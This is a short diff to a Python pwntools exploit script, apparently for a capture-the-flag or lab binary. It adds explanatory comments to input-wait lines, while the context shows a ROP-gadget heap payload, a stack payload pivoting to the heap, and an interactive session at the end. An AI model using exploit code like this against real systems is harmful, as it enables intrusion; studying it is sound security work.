@@ -504,7 +504,7 @@ heap_payload += p64(add_rbp_rax)
 heap_payload += p64(call_rax)
 
 assert len(heap_payload) <= 256, "Heap payload must NOT be larger than 256 bytes!"
-p.recvuntil(b'> ')
+p.recvuntil(b'> ') # wait 'til app is ready to receive input
 p.sendline(heap_payload)
 
 # ** Input stack payload
@@ -515,7 +515,7 @@ stack_payload += p64(heap_address)
 # Values are now pop'ed from the heap memory
 
 assert len(stack_payload) <= 64, "Stack payload must NOT be larger than 64 bytes!"
-p.recvuntil(b'> ')
+p.recvuntil(b'> ') # wait 'til app is ready to receive input
 p.sendline(stack_payload)
 
 p.interactive()
